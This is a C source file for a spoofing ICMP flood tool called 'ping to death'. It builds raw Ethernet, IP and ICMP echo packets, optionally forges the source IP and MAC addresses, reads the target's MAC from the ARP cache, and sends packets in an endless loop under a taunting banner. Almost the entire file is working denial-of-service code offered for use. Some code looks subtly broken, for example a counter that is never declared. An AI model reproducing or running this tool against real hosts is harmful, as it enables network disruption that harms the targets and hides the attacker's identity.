/*

	title		-> hank-ptd (ping to death)
	description	-> used to flood the target with icmp echo packets (requests)
	author		-> hank

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <signal.h>

#include "ether_hdr.h"
#include "ip_hdr.h"
#include "icmp_hdr.h"
#include "utils.h"

#define	HDR_LEN		100
#define ETH_LEN		6
#define ETH_TYPE	0x0800
#define	DONT_FRAG	0x4000
#define	ICMP_PROTO	1
#define	ECHO_REQ	8
#define	ARP_CACHE	"/proc/net/arp"

void main(int argc,char *argv[])
{

 char	hdr[HDR_LEN],
	interface[16],
	arp_ip[15],
	arp_mac[20];
 unsigned char	src_mac[ETH_LEN],
		dst_mac[ETH_LEN];
 unsigned short int	spoof_mac=0,
			spoof_ip=0,
			loop,
			packet_len,
			ip_offset,
			ip_flags,fill_packet,
			if_index,
			icmp_seq=1,
			found_arp_cache=0,
			arp_sent=0,
			line_count=0;
 int	sock_fd;
 struct ether_hdr *ether_hdr;
 struct ip_hdr *ip_hdr;
 struct icmp_hdr *icmp_hdr;
 struct ifreq if_info;
 struct sockaddr_in src_ip,dst_ip;
 struct sockaddr_ll sock_dst;
 FILE	*arp_cache;

 printf("\n");
 if(argc < 4)
 {
	usage();
	exit(0);
 }
 for(loop=1;loop<argc;loop++)
 {
	if(argv[loop][0]=='-')
	{
		if(argv[loop][1]=='s')
		{
			if(strlen(argv[loop])==2)
			{
				if(argc > loop+1)
				{
					if(argv[loop+1][0]!='-')
					{
						if(!inet_addr(argv[loop+1]))
						{
							printf("invalid source ip address ...\n");
							exiting();
						}
						else
						{
							src_ip.sin_family=AF_INET;
							src_ip.sin_addr.s_addr=inet_addr(argv[loop+1]);
							spoof_ip=1;
							loop++;
						}
					}
					else
					{
						printf("[\x1b[31m-\x1b[0m] specify the source ip address\n");
						exiting();
					}
				}
				else
				{
					printf("[\x1b[31m-\x1b[0m] specify the source ip address\n");
					exiting();
				}
			}
			else
			{
				usage();
				exit(0);
			}
		}

		else if(argv[loop][1]=='m')
		{
			if(strlen(argv[loop])==2)
			{
				if(argc > loop+1)
				{
					if(argv[loop+1][0]!='-')
					{
						spoof_mac=1;
						unsigned short int	mac_pos=0,
									in_loop;

						for(in_loop=0;in_loop < ETH_LEN;in_loop++)
						{
							src_mac[in_loop] = (unsigned short)(strtol((char *)&(argv[loop+1][mac_pos]),NULL,16));
							mac_pos += 3;
						}
						loop++;
					}
					else
					{
						printf("[\x1b[31m-\x1b[0m] specify the source mac address\n");
						exiting();
					}
				}
				else
				{
					printf("[\x1b[31m-\x1b[0m] specify the source mac address\n");
					exiting();
				}
			}
			else
			{
				usage();
				exit(0);
			}
		}

		else if(argv[loop][1]=='t')
		{
			if(strlen(argv[loop])==2)
			{
				if(argc > loop+1)
				{
					if(argv[loop+1][0]!='-')
					{
						if(!inet_addr(argv[loop+1]))
						{
							printf("invalid ip address ...\n");
							exiting();
						}
						else
						{
							dst_ip.sin_family=AF_INET;
							dst_ip.sin_addr.s_addr = inet_addr(argv[loop+1]);
							loop++;
						}
					}
					else
					{
						printf("[\x1b[31m-\x1b[0m] specify the destination ip address\n");
						exiting();
					}
				}
				else
				{
					printf("[\x1b[31m-\x1b[0m] specify the destination ip address\n");
					exiting();
				}
			}
			else
			{
				usage();
				exit(0);
			}
		}

		else if(argv[loop][1]=='i')
		{
			if(strlen(argv[loop])==2)
			{
				if(argc > loop+1)
				{
					bzero(interface,16);
					if(argv[loop+1][0]!='-')
					{
						strcpy(interface,argv[loop+1]);
						if(!strcmp("lo",interface))
						{
							printf("\n[\x1b[31m-\x1b[0m] sorry, it doesn't work on loopback interface ...\n");
							exiting();
						}

						loop++;
					}
					else
					{
						printf("[\x1b[31m-\x1b[0m] specify the interface\n");
						exiting();
					}
				}
				else
				{
					printf("[\x1b[31m-\x1b[0m] specify the interface\n");
					exiting();
				}
			}
			else
			{
				usage();
				exit(0);
			}
		}
		
		else
		{
			usage();
			exit(0);
		}
	}

	else
	{
		usage();
		exit(0);
	}
 }

 signal(SIGINT,terminate);
 bzero(hdr,sizeof(hdr));

 if((sock_fd=socket(AF_PACKET,SOCK_RAW,IPPROTO_RAW))==-1)
 {
	perror("socket");
	exiting();
 }

 bzero(&if_info,sizeof(struct ifreq));

 strncpy(if_info.ifr_name,interface,IFNAMSIZ-1);

 if(ioctl(sock_fd,SIOCGIFINDEX,&if_info)==-1)
 {
	perror("SIOCGIFINDEX");
	exiting();
 }
 if_index=if_info.ifr_ifindex;

 if(ioctl(sock_fd,SIOCGIFHWADDR,&if_info)==-1)
 {
	perror("SIOCGIFHWADDR");
	exiting();
 }

 if(spoof_mac ==0 )
 {
	for(loop=0;loop < ETH_LEN;loop++)
		src_mac[loop]=(unsigned char)if_info.ifr_hwaddr.sa_data[loop];
 }

 if(ioctl(sock_fd,SIOCGIFADDR,&if_info) == -1)
 {
	perror("SIOCGIFADDR");
	exiting();
 }

 if((arp_cache=fopen(ARP_CACHE,"r")) == NULL)
 {
	perror("arp_cache");
	exiting();
 }

 printf("[\x1b[34m*\x1b[0m] starting ping to death ... have fun ...");
 printf("\n\n\x1b[32m\t -----------------------------------------------\x1b[0m\n");
 printf("\t\x1b[32m|\x1b[1m     \x1b[32mIf thEy d0nt want pe0plE insidE ...\x1b[0m\t\x1b[32m|\n");
 printf("\t\x1b[32m|\x1b[1m     \t\x1b[31mThEy 0uGht t0 build it bEttEr ...\x1b[0m\t\x1b[32m|\n");
 printf("\x1b[32m\t -----------------------------------------------\x1b[0m\n");

 fseek(arp_cache,79,SEEK_SET);
 while(1)
 {
	if(feof(arp_cache))
	{
		rewind(arp_cache);
		if(arp_sent == 0)
		{
			printf("[\x1b[31m-\x1b[0m] %s not found in arp cache ...\n",inet_ntoa(dst_ip.sin_addr));
			printf("[\x1b[34m*\x1b[0m] sending arp request to %s ...\n",inet_ntoa(dst_ip.sin_addr));
			arp();
			arp_sent = 1;
			flood_count = 1;
			fseek(arp_cache,79,SEEK_SET);
		}

		else
			break;
	}

	fscanf(arp_cache,"%s",arp_ip);

	if(!strcmp(arp_ip,inet_ntoa(dst_ip.sin_addr)))
	{
		printf("[\x1b[32m+\x1b[0m] %s found in arp cache\n",inet_ntoa(dst_ip.sin_addr));
		found_arp_cache = 1;

		fseek(arp_cache,(79 + line_count + 41),SEEK_SET);
		bzero(arp_mac,20);
		fscanf(arp_cache,"%s",arp_mac);
		printf("[\x1b[34m*\x1b[0m] %s has the mac address %s\n",inet_ntoa(dst_ip.sin_addr),arp_mac);

		unsigned short int mac_pos = 0;

		for(loop = 0;loop < ETH_LEN;loop++)
		{
			dst_mac[loop] = (unsigned short)(strtol((char *)&(arp_mac[mac_pos]),NULL,16));
			mac_pos += 3;
		}
		break;
	}
	else
	{
		line_count += flood_count * 78 ;
		if(feof(arp_cache))
			break;

		fseek(arp_cache,79 + line_count,SEEK_SET);
	}

	flood_count++;
 }

 if(found_arp_cache == 0)
 {
	printf("[\x1b[31m-\x1b[0m] %s not found in arp cache ...\n",inet_ntoa(dst_ip.sin_addr));
	exiting();
 }

 printf("\n[\x1b[34m*\x1b[0m] interface\t= %s\n",interface);
 if(spoof_mac == 1)
 {
	printf("[\x1b[34m*\x1b[0m] source mac\t= spoofed(");
	for(loop = 0;loop < ETH_LEN;loop++)
		printf("%02x:",src_mac[loop]);
	printf("\b)\n");
 }

 else
 {
	printf("[\x1b[34m*\x1b[0m] source mac\t= ");
	for(loop = 0;loop < ETH_LEN;loop++)
		printf("%02x:",src_mac[loop]);
	printf("\b \n");
 }

 printf("[\x1b[34m*\x1b[0m] dest mac\t= ");
 for(loop = 0;loop < ETH_LEN;loop++)
	printf("%02x:",dst_mac[loop]);
 printf("\b \n");

 if(spoof_ip==0)
 {
	struct sockaddr_in *src_ip_ptr = (struct sockaddr_in *)&if_info.ifr_addr;
	
	src_ip.sin_family = AF_INET;
	src_ip.sin_addr.s_addr = src_ip_ptr->sin_addr.s_addr;
	printf("[\x1b[34m*\x1b[0m] source ip\t= %s\n",inet_ntoa(src_ip.sin_addr));
 }

 else
	printf("[\x1b[34m*\x1b[0m] source ip\t= spoofed (%s)\n",inet_ntoa(src_ip.sin_addr));

 printf("[\x1b[34m*\x1b[0m] target ip\t= %s\n",inet_ntoa(dst_ip.sin_addr));

 printf("\n[\x1b[32m+\x1b[0m] sending the icmp packets ...\n");

 while(1)
 {
	ether_hdr=(struct ether_hdr *)hdr;
	ip_hdr=(struct ip_hdr *)(hdr+sizeof(struct ether_hdr));
	icmp_hdr=(struct icmp_hdr *)(hdr+sizeof(struct ether_hdr)+sizeof(struct ip_hdr));
	packet_len = 0;
	fill_packet = 0;
	bzero(hdr,sizeof(hdr));

	for(loop = 0;loop < ETH_LEN;loop++)
	{
		ether_hdr->src_mac_addr[loop] = src_mac[loop];
		ether_hdr->dst_mac_addr[loop] = dst_mac[loop];
	}
	ether_hdr->eth_type = htons(ETH_TYPE);

	packet_len=sizeof(struct ether_hdr);

	ip_hdr->ip_hl = 5;
	ip_hdr->ip_ver = 4;
	ip_hdr->tos = 0;
	ip_hdr->length = htons(sizeof(hdr)-sizeof(struct ether_hdr));
	ip_hdr->id = htons(rand()%65535);

	ip_offset = 0;
	ip_flags = DONT_FRAG;

	ip_hdr->offset = htons(ip_offset+ip_flags);
	ip_hdr->ttl = 64;
	ip_hdr->protocol = ICMP_PROTO;
	ip_hdr->ip_src = src_ip.sin_addr.s_addr;
	ip_hdr->ip_dst = dst_ip.sin_addr.s_addr;
	ip_hdr->chksm = htons(checksum(hdr,packet_len,sizeof(struct ip_hdr)));

	packet_len += sizeof(struct ip_hdr);

	icmp_hdr->type = ECHO_REQ;
	icmp_hdr->code = 0;
	icmp_hdr->checksum = 0;

	icmp_hdr->id = htons(rand()%65535);
	icmp_hdr->seq = htons(icmp_seq++);

	fill_packet = HDR_LEN - (packet_len + sizeof(struct icmp_hdr));
	for(loop = 1;loop <= fill_packet;loop++)
		hdr[loop + packet_len + sizeof(struct icmp_hdr)] = loop;

	icmp_hdr->checksum = htons(checksum(hdr,packet_len,HDR_LEN-packet_len));
	packet_len += sizeof(struct icmp_hdr) + fill_packet;

	sock_dst.sll_family = AF_INET;
	sock_dst.sll_protocol = 0;
	sock_dst.sll_ifindex = if_index;
	sock_dst.sll_halen = ETH_LEN;

	for(loop = 0;loop < ETH_LEN;loop++)
		sock_dst.sll_addr[loop] = dst_mac[loop];

	if(sendto(sock_fd,hdr,packet_len,0,(struct sockaddr *)&sock_dst,sizeof(struct sockaddr_ll))==-1)
	{
		perror("send");
		exiting();
	}
	printf("\r[\x1b[32m+\x1b[0m] icmp packets sent = %lld",(flood_count++)-1);
fflush(stdout);
//if(flood_count>2)exit(0);
 }
}
